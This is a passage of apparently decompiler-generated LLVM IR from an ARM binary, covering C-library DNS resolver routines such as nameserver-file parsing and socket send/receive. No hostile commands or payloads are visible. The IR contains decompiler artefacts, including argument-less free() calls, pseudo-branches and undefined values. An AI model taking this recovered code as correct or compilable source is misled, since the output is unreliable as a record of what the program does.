  %v3_2ec6c = load i32, i32* %v2_2ec6c, align 4
  %v1_2ec70 = add i32 %v3_2ec6c, 1
  store i32 %v1_2ec70, i32* %r3.global-to-local, align 4
  store i32 %v1_2ec70, i32* %v2_2ec6c, align 4
  br label %dec_label_pc_2ec78

dec_label_pc_2ec78:                               ; preds = %bb232, %dec_label_pc_2ec20, %dec_label_pc_2ec10, %dec_label_pc_2ec54
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_2ec54 ], [ 0, %dec_label_pc_2ec20 ], [ 0, %dec_label_pc_2ec10 ], [ 1, %bb232 ]
  %v1_2ec80 = load i32, i32* @r4, align 4
  %v2_2ec80 = add i32 %v1_2ec80, %stack_var_-460.365
  %v1_2ec84 = add nuw nsw i32 %stack_var_-452.062, 1
  store i32 %v1_2ec84, i32* %r1.global-to-local, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %v1_2ec84, i32* %r2.global-to-local, align 4
  %v3_2ec98 = icmp uge i32 %v1_2ec84, %tmp163
  store i1 %v3_2ec98, i1* %cpsr_c.global-to-local, align 1
  %v5_2ec9c = icmp slt i32 %v1_2ec84, %tmp163
  br i1 %v5_2ec9c, label %dec_label_pc_2ea64, label %dec_label_pc_2eca0

dec_label_pc_2eca0:                               ; preds = %dec_label_pc_2eb5c, %dec_label_pc_2ea3c, %dec_label_pc_2ec78, %dec_label_pc_2ebb4, %dec_label_pc_2ebe4, %bb231
  %v1_2eca4 = call i32 @__GI___libc_close(i32 %v3_2e858)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2ecac = icmp eq i32 %arg3, 0
  br i1 %v2_2ecac, label %.thread22, label %bb234

bb234:                                            ; preds = %dec_label_pc_2eca0
  %v1_2ecb4 = load i32, i32* @sl, align 4
  %v3_2ecb0 = inttoptr i32 %arg3 to i32*
  store i32 %v1_2ecb4, i32* %v3_2ecb0, align 4
  br label %bb235

.thread22:                                        ; preds = %dec_label_pc_2eca0
  br label %bb235

bb235:                                            ; preds = %bb234, %.thread22
  store i32 ptrtoint (i32* @global_var_2ecbc.3559 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_2ecac, i32 ptrtoint (i32* @global_var_264e8.3412 to i32))
  store i32 %v1_2e5dc, i32* @r0, align 4
  %v0_2ecc0 = call i32 @free()
  br label %dec_label_pc_2ed38

dec_label_pc_2ecc8:                               ; preds = %thread-pre-split, %dec_label_pc_2e8a4, %dec_label_pc_2ea14, %dec_label_pc_2ea0c, %dec_label_pc_2e9bc, %dec_label_pc_2e9c8, %dec_label_pc_2e9d4thread-pre-split, %thread-pre-split.thread, %dec_label_pc_2e984, %dec_label_pc_2eb5c, %dec_label_pc_2eb50, %dec_label_pc_2e868, %dec_label_pc_2e848, %dec_label_pc_2ec48
  %v1_2eccc = add i32 %v0_2e76c, 1
  store i32 %v1_2eccc, i32* @r5, align 4
  br label %dec_label_pc_2ecd8

dec_label_pc_2ecd8:                               ; preds = %.thread8, %dec_label_pc_2ecc8
  %storemerge23 = phi i32 [ -1, %dec_label_pc_2ecc8 ], [ %v7_2e968, %.thread8 ]
  %stack_var_-468.2 = phi i32 [ %v1_2eccc, %dec_label_pc_2ecc8 ], [ %v0_2e76c, %.thread8 ]
  store i32 %storemerge23, i32* @r7, align 4
  %v1_2ecdc = add i32 %stack_var_-476.1, -1
  store i32 %v1_2ecdc, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp236 = icmp slt i32 %v1_2ecdc, 1
  br i1 %tmp236, label %dec_label_pc_2ecf8, label %dec_label_pc_2e678

dec_label_pc_2ecf0:                               ; preds = %dec_label_pc_2e81c, %bb222, %bb217, %.thread6, %dec_label_pc_2e5f8
  br label %dec_label_pc_2ecf8

dec_label_pc_2ecf8:                               ; preds = %dec_label_pc_2ecd8, %.thread134, %dec_label_pc_2ecf0
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_2ecf0 ], [ -1, %.thread134 ], [ %v3_2e858, %dec_label_pc_2ecd8 ]
  %stack_var_-472.1 = phi i32 [ %v1_2e5dc, %dec_label_pc_2ecf0 ], [ 0, %.thread134 ], [ %v1_2e5dc, %dec_label_pc_2ecd8 ]
  store i32 80868, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  %v0_2ed00 = call i32 @__aeabi_read_tp()
  %v3_2ed04 = load i32, i32* @global_var_428f0.3141, align 4
  store i32 %v3_2ed04, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_2ed0c = load i32, i32* %r1.global-to-local, align 4
  %v2_2ed0c = icmp eq i32 %v0_2ed0c, -1
  store i1 %v2_2ed0c, i1* %cpsr_c.global-to-local, align 1
  %v7_2ed0c = icmp eq i32 %v0_2ed0c, -1
  %v3_2ed10 = add i32 %v3_2ed04, %v0_2ed00
  %v4_2ed10 = inttoptr i32 %v3_2ed10 to i32*
  store i32 -1, i32* %v4_2ed10, align 4
  br i1 %v7_2ed0c, label %dec_label_pc_2ed20, label %dec_label_pc_2ed18

dec_label_pc_2ed18:                               ; preds = %dec_label_pc_2ecf8, %dec_label_pc_2e9b4
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_2ecf8 ], [ %v3_2e858, %dec_label_pc_2e9b4 ]
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_2ecf8 ], [ %v1_2e5dc, %dec_label_pc_2e9b4 ]
  %v1_2ed1c = call i32 @__GI___libc_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_2ed20

dec_label_pc_2ed20:                               ; preds = %dec_label_pc_2ecf8, %dec_label_pc_2ed18
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_2ecf8 ], [ %stack_var_-472.2, %dec_label_pc_2ed18 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_2ed24 = call i32 @free()
  %v0_2ed28 = load i32, i32* @sl, align 4
  store i32 %v0_2ed28, i32* @r0, align 4
  %v0_2ed2c = call i32 @free()
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2ed38

dec_label_pc_2ed38:                               ; preds = %bb235, %dec_label_pc_2ed20
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_2ed20 ], [ %v5_2e8e0, %bb235 ]
  store i32 %v3_2e580, i32* @r4, align 4
  store i32 %v6_2e580, i32* @r5, align 4
  store i32 %v9_2e580, i32* @r6, align 4
  store i32 %v12_2e580, i32* @r7, align 4
  store i32 %v15_2e580, i32* @r8, align 4
  store i32 %v18_2e580, i32* @sb, align 4
  store i32 %v21_2e580, i32* @sl, align 4
  store i32 %v24_2e580, i32* @fp, align 4
  store i32 %v27_2e580, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_2ecdc, { 1, 2, 0 }
  uselistorder i32 %v1_2ec84, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_2ec38, { 2, 1, 0, 3 }
  uselistorder i32 %v1_2ebf4, { 1, 0, 2 }
  uselistorder i32 %v0_2eb78, { 1, 0, 2, 3 }
  uselistorder i32 %v2_2eb20, { 1, 0 }
  uselistorder i32 %v5_2eaf8, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_2eab8, { 4, 5, 0, 6, 7, 1, 2, 3, 8, 9, 10, 11 }
  uselistorder i32 %v2_2eab4, { 1, 0 }
  uselistorder i32 %v2_2ea98, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_2ea94, { 1, 0 }
  uselistorder i32 %v1_2ea90, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.062, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.365, { 0, 1, 4, 2, 3 }
  uselistorder i32 %v0_2ea0c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_2e9e8, { 1, 0 }
  uselistorder i32 %v3_2e9dc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_2e9dc, { 0, 2, 1 }
  uselistorder i32 %v2_2e9d0, { 0, 2, 1 }
  uselistorder i1 %v7_2e8f0, { 1, 0 }
  uselistorder i32 %v1_2e8f0, { 1, 0 }
  uselistorder i32 %v0_2e8f0, { 1, 0 }
  uselistorder i32 %v5_2e8e0, { 1, 2, 4, 3, 0, 5, 6, 7 }
  uselistorder i32 %v0_2e8b4, { 1, 0 }
  uselistorder i32 %v3_2e858, { 1, 0, 2, 6, 7, 5, 4, 8, 9, 10, 3 }
  uselistorder i32 %v6_2e810, { 1, 0, 2, 3 }
  uselistorder i32 %v0_2e79c, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32 %v3_2e784, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 %v1_2e778, { 1, 0 }
  uselistorder i32 %v0_2e76c, { 4, 3, 1, 2, 0 }
  uselistorder i32 %v0_2e724, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_2e690, { 1, 0, 2 }
  uselistorder i1 %v7_2e67c, { 1, 0 }
  uselistorder i32 %v1_2e680, { 0, 2, 1 }
  uselistorder i32 %v2_2ea44, { 1, 0 }
  uselistorder i32 %v1_2e944, { 2, 0, 1 }
  uselistorder i32 %v2_2e7cc, { 1, 0, 2 }
  uselistorder i32 %v2_2e7a4, { 1, 0 }
  uselistorder i32 %v0_2e5f8, { 1, 0, 2 }
  uselistorder i32 %v1_2e5dc, { 5, 0, 2, 4, 3, 6, 7, 1, 8, 9 }
  uselistorder i32 %v3_2e5a8, { 6, 1, 3, 2, 4, 5, 0, 7 }
  uselistorder i32 %v0_2e594, { 9, 8, 7, 6, 5, 4, 10, 0, 1, 3, 2 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp164, { 1, 0, 2 }
  uselistorder i32 %tmp163, { 8, 7, 6, 0, 5, 2, 3, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 20, 21, 1, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 37, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 29, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 1, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 2, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 (i32)* @__GI___libc_close, { 13, 12, 14, 20, 19, 18, 17, 16, 15, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 23, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 1000, { 3, 2, 4, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 5, 10, 9, 8, 7, 6, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 7, 6, 5, 4, 3, 2, 1, 8 }
  uselistorder i32 17, { 1, 10, 2, 11, 0, 9, 12, 3, 4, 6, 5, 7, 8 }
  uselistorder i32 124, { 1, 3, 4, 5, 6, 7, 8, 2, 9, 0 }
  uselistorder i32 27, { 2, 1, 0, 3 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 28816, { 1, 0, 2, 3 }
  uselistorder i32 512, { 3, 6, 7, 2, 8, 4, 9, 1, 10, 11, 12, 13, 5, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_2ed38, { 1, 0 }
  uselistorder label %dec_label_pc_2ed20, { 1, 0 }
  uselistorder label %dec_label_pc_2ecf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2ecf0, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_2ecd8, { 1, 0 }
  uselistorder label %dec_label_pc_2ecc8, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb235, { 1, 0 }
  uselistorder label %dec_label_pc_2eca0, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_2ec78, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_2ebd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2eb50, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_2ea64, { 1, 0 }
  uselistorder label %dec_label_pc_2ea0c, { 1, 0 }
  uselistorder label %dec_label_pc_2e9dc, { 1, 0 }
  uselistorder label %dec_label_pc_2e9b4, { 1, 0 }
  uselistorder label %dec_label_pc_2e8f0, { 1, 0, 2 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_2e74c, { 1, 0 }
  uselistorder label %dec_label_pc_2e710, { 1, 0 }
  uselistorder label %bb220, { 1, 0 }
}

define i32 @"$d"(i64* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_2ed48:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_2ed48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2ed48, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_2ed48
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_2ed48, %bb
  %v9_2ed80 = phi i32 [ %tmp, %dec_label_pc_2ed48 ], [ 0, %bb ]
  ret i32 %v9_2ed80

; uselistorder directives
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 360, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2ede8 = load i32, i32* @r4, align 4
  store i32 %v3_2ede8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %ip.global-to-local, align 4
  store i32 360, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_2edf8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_2edf89 = inttoptr i32 %v0_2edf8.pre to i8*
  %v2_2edf810 = load i8, i8* %v1_2edf89, align 1
  %v2_2edfc12 = icmp eq i8 %v2_2edf810, 0
  store i1 %v2_2edfc12, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2edfc12, label %dec_label_pc_2ee2c, label %dec_label_pc_2ee08

dec_label_pc_2ee08:                               ; preds = %entry, %bb8.dec_label_pc_2ee08_crit_edge
  %v1_2ee08 = phi i32 [ %v1_2ee08.pre, %bb8.dec_label_pc_2ee08_crit_edge ], [ 360, %entry ]
  %v0_2ee08 = phi i32 [ %v0_2ee08.pre, %bb8.dec_label_pc_2ee08_crit_edge ], [ ptrtoint (i32* @global_var_428d0.3044 to i32), %entry ]
  %v2_2edf816 = phi i8 [ %v2_2edf8, %bb8.dec_label_pc_2ee08_crit_edge ], [ %v2_2edf810, %entry ]
  %v2_2ee0017.in.in = phi i8 [ %v2_2edf8, %bb8.dec_label_pc_2ee08_crit_edge ], [ %v2_2edf810, %entry ]
  %v1_2edf815 = phi i8* [ %v1_2edf8, %bb8.dec_label_pc_2ee08_crit_edge ], [ %v1_2edf89, %entry ]
  %v2_2ee2014 = phi i32 [ %v2_2ee24, %bb8.dec_label_pc_2ee08_crit_edge ], [ %v0_2edf8.pre, %entry ]
  %v2_2ee0017.in = zext i8 %v2_2ee0017.in.in to i32
  %v2_2ee0017 = mul nuw nsw i32 %v2_2ee0017.in, 2
  %v2_2ee08 = add i32 %v1_2ee08, %v0_2ee08
  %v3_2ee08 = inttoptr i32 %v2_2ee08 to i32*
  %v4_2ee08 = load i32, i32* %v3_2ee08, align 4
  %v2_2ee0c = add i32 %v4_2ee08, %v2_2ee0017
  %v3_2ee0c = inttoptr i32 %v2_2ee0c to i16*
  %v4_2ee0c = load i16, i16* %v3_2ee0c, align 2
  %v1_2ee10 = and i16 %v4_2ee0c, 32
  %v2_2ee10 = icmp eq i16 %v1_2ee10, 0
  store i1 %v2_2ee10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ee10, label %dec_label_pc_2ee2c, label %dec_label_pc_2ee18

dec_label_pc_2ee18:                               ; preds = %dec_label_pc_2ee08
  %v7_2ee18 = icmp eq i8 %v2_2edf816, 35
  br i1 %v7_2ee18, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_2ee18
  %v8_2ee1c = icmp eq i8 %v2_2edf816, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_2ee18, %bb
  %storemerge = phi i1 [ %v8_2ee1c, %bb ], [ %v7_2ee18, %dec_label_pc_2ee18 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_2ee20 = load i32, i32* %lr.global-to-local, align 4
  %v1_2ee20 = trunc i32 %v0_2ee20 to i8
  store i8 %v1_2ee20, i8* %v1_2edf815, align 1
  %v0_2ee24 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_2ee30.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_2ee24, label %dec_label_pc_2ee2c, label %bb8

bb8:                                              ; preds = %bb7
  %v2_2ee24 = add i32 %v1_2ee30.pre, 1
  store i32 %v2_2ee24, i32* %r0.global-to-local, align 4
  %v1_2edf8 = inttoptr i32 %v2_2ee24 to i8*
  %v2_2edf8 = load i8, i8* %v1_2edf8, align 1
  %v2_2edfc = icmp eq i8 %v2_2edf8, 0
  store i1 %v2_2edfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2edfc, label %dec_label_pc_2ee2c, label %bb8.dec_label_pc_2ee08_crit_edge

bb8.dec_label_pc_2ee08_crit_edge:                 ; preds = %bb8
  %v0_2ee08.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_2ee08.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2ee08

dec_label_pc_2ee2c:                               ; preds = %bb8, %dec_label_pc_2ee08, %bb7, %entry
  %v1_2ee30 = phi i32 [ %v0_2edf8.pre, %entry ], [ %v1_2ee30.pre, %bb7 ], [ %v2_2ee2014, %dec_label_pc_2ee08 ], [ %v2_2ee24, %bb8 ]
  %v2_2ee2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2ee2c, i32* @r4, align 4
  ret i32 %v1_2ee30

; uselistorder directives
  uselistorder i8 %v2_2edf8, { 2, 1, 0 }
  uselistorder i8* %v1_2edf8, { 1, 0 }
  uselistorder i32 %v2_2ee24, { 0, 2, 3, 1 }
  uselistorder i1 %v2_2ee10, { 1, 0 }
  uselistorder i8 %v2_2edf816, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 2, 0, 3, 1 }
  uselistorder i16 0, { 0, 5, 1, 6, 2, 3, 4, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 360, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_2ee2c, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_2ee08, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_2ee3c = load i32, i32* @r4, align 4
  store i32 %v3_2ee3c, i32* %stack_var_-36, align 4
  %v12_2ee3c = load i32, i32* @r7, align 4
  %v15_2ee3c = load i32, i32* @r8, align 4
  %v18_2ee3c = load i32, i32* @sb, align 4
  %v21_2ee3c = load i32, i32* @sl, align 4
  %v27_2ee3c = load i32, i32* @lr, align 4
  store i32 29896, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r5, align 4
  %v4_2ee4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29896) to i32*), align 4
  store i32 %v4_2ee4c, i32* @r4, align 4
  %v2_2ee50 = icmp eq i32 %v4_2ee4c, 0
  br i1 %v2_2ee50, label %dec_label_pc_2ee5c, label %dec_label_pc_2ee8c

dec_label_pc_2ee5c:                               ; preds = %entry
  %v2_2ee60 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_2ee60, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33224), i32* %r0.global-to-local, align 4
  %v2_2ee68 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33224), i32 %v2_2ee60)
  store i32 %v2_2ee68, i32* %r0.global-to-local, align 4
  %v2_2ee6c = icmp eq i32 %v2_2ee68, 0
  %v1_2ee70 = load i32, i32* @r4, align 4
  %.v1_2ee70 = select i1 %v2_2ee6c, i32 %tmp38, i32 %v1_2ee70
  store i32 28844, i32* %r1.global-to-local, align 4
  store i32 %.v1_2ee70, i32* %r2.global-to-local, align 4
  %v0_2ee7c = load i32, i32* @r5, align 4
  %v2_2ee7c = add i32 %v0_2ee7c, 28844
  %v3_2ee7c = inttoptr i32 %v2_2ee7c to i32*
  %v4_2ee7c = load i32, i32* %v3_2ee7c, align 4
  store i32 %v4_2ee7c, i32* %r3.global-to-local, align 4
  %v9_2ee80 = icmp eq i32 %v4_2ee7c, %.v1_2ee70
  br i1 %v9_2ee80, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_2ee5c
  store i32 %.v1_2ee70, i32* %v3_2ee7c, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_2ee5c, %bb
  store i32 192140, i32* @lr, align 4
  %v1_2ee88 = xor i1 %v9_2ee80, true
  call void @__pseudo_cond_branch(i1 %v1_2ee88, i32 ptrtoint (i32* @global_var_2f298.3570 to i32))
  %v0_2ee90.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2ee8c

dec_label_pc_2ee8c:                               ; preds = %entry, %bb58
  %v2_2eea4 = phi i32 [ ptrtoint (i32* @global_var_428d0.3044 to i32), %entry ], [ %v0_2ee90.pre, %bb58 ]
  store i32 29908, i32* %r3.global-to-local, align 4
  %v2_2ee90 = add i32 %v2_2eea4, 29908
  %v3_2ee90 = inttoptr i32 %v2_2ee90 to i32*
  %v4_2ee90 = load i32, i32* %v3_2ee90, align 4
  store i32 %v4_2ee90, i32* %r3.global-to-local, align 4
  %v2_2ee94 = icmp eq i32 %v4_2ee90, 0
  br i1 %v2_2ee94, label %dec_label_pc_2ee9c, label %dec_label_pc_2f230

dec_label_pc_2ee9c:                               ; preds = %dec_label_pc_2ee8c
  %v4_2eea4 = add i32 %v2_2eea4, 878
  %v5_2eea4 = inttoptr i32 %v4_2eea4 to i8*
  store i8 5, i8* %v5_2eea4, align 1
  store i32 -33224, i32* %r0.global-to-local, align 4
  store i32 879, i32* %r3.global-to-local, align 4
  store i32 -33252, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v3_2eeb8 = load i32, i32* @r5, align 4
  %v5_2eeb8 = add i32 %v3_2eeb8, 879
  %v6_2eeb8 = inttoptr i32 %v5_2eeb8 to i8*
  store i8 3, i8* %v6_2eeb8, align 1
  %v0_2eebc = load i32, i32* @r5, align 4
  %v1_2eebc = load i32, i32* %r0.global-to-local, align 4
  %v2_2eebc = add i32 %v1_2eebc, %v0_2eebc
  store i32 %v2_2eebc, i32* @r0, align 4
  %v1_2eec0 = load i32, i32* %r1.global-to-local, align 4
  %v2_2eec0 = add i32 %v1_2eec0, %v0_2eebc
  store i32 %v2_2eec0, i32* @r1, align 4
  %v5_2eec4 = call i32 @__GI_fopen(i32 %v2_2eebc, i32 %v2_2eec0, i32 3, i32 879)
  store i32 %v5_2eec4, i32* %r0.global-to-local, align 4
  store i32 %v5_2eec4, i32* @fp, align 4
  %v2_2eec8 = icmp eq i32 %v5_2eec4, 0
  br i1 %v2_2eec8, label %dec_label_pc_2f154, label %dec_label_pc_2f0fc

dec_label_pc_2eed4:                               ; preds = %dec_label_pc_2f0fc, %dec_label_pc_2f130.backedge
  store i32 %v2_2f130, i32* %r0.global-to-local, align 4
  %v2_2eed8 = call i32 @skip_and_NUL_space(i8* %v1_2eed8)
  store i32 %v2_2eed8, i32* %r0.global-to-local, align 4
  store i32 %v2_2eed8, i32* @r4, align 4
  %v0_2eee0 = call i32 @skip_nospace()
  store i32 %v0_2eee0, i32* %r0.global-to-local, align 4
  %v1_2eee4 = inttoptr i32 %v0_2eee0 to i8*
  %v2_2eee4 = call i32 @skip_and_NUL_space(i8* %v1_2eee4)
  store i32 %v2_2f100, i32* @r1, align 4
  store i32 %v2_2eee4, i32* @r7, align 4
  %v0_2eef0 = load i32, i32* @r4, align 4
  store i32 %v0_2eef0, i32* %r0.global-to-local, align 4
  %v2_2eef4 = inttoptr i32 %v0_2eef0 to i8*
  %v3_2eef4 = call i32 @__GI_strcoll(i8* %v2_2eef4, i32 %v2_2f100)
  store i32 %v3_2eef4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_2eef4, 16777216
  %v1_2eef8 = sdiv i32 %sext, 16777216
  store i32 %v1_2eef8, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_2ef00, label %dec_label_pc_2efbc

dec_label_pc_2ef00:                               ; preds = %dec_label_pc_2eed4
  %v0_2ef00 = load i32, i32* @r7, align 4
  store i32 %v0_2ef00, i32* %r0.global-to-local, align 4
  %v0_2ef04 = call i32 @skip_nospace()
  %v1_2ef04 = inttoptr i32 %v0_2ef04 to i8*
  store i32 %v2_2ef08, i32* @r4, align 4
  %v0_2ef0c = load i32, i32* @r6, align 4
  %v1_2ef0c = trunc i32 %v0_2ef0c to i8
  store i8 %v1_2ef0c, i8* %v1_2ef04, align 1
  %v0_2ef10 = load i32, i32* @r6, align 4
  store i32 %v0_2ef10, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_2ef08, i32* %r0.global-to-local, align 4
  %v4_2ef1c = call i32 @__GI_memset(i8* %v3_2ef1c, i32 %v0_2ef10, i32 28)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_2ef24 = load i32, i32* @r7, align 4
  store i32 %v0_2ef24, i32* %r1.global-to-local, align 4
  store i32 %v2_2ef28, i32* %r2.global-to-local, align 4
  %v3_2ef2c = inttoptr i32 %v0_2ef24 to i8*
  %v4_2ef2c = call i32 @inet_pton(i32 10, i8* %v3_2ef2c, i32 %v2_2ef28)
  store i32 %v4_2ef2c, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_2ef2c, 1
  br i1 %tmp59, label %dec_label_pc_2ef3c, label %dec_label_pc_2ef58

dec_label_pc_2ef3c:                               ; preds = %dec_label_pc_2ef00
  %v0_2ef3c = load i32, i32* @r7, align 4
  store i32 %v0_2ef3c, i32* %r1.global-to-local, align 4
  store i32 %v2_2ef40, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_2ef48 = inttoptr i32 %v0_2ef3c to i8*
  %v4_2ef48 = call i32 @inet_pton(i32 2, i8* %v3_2ef48, i32 %v2_2ef40)
  store i32 %v4_2ef48, i32* %r0.global-to-local, align 4
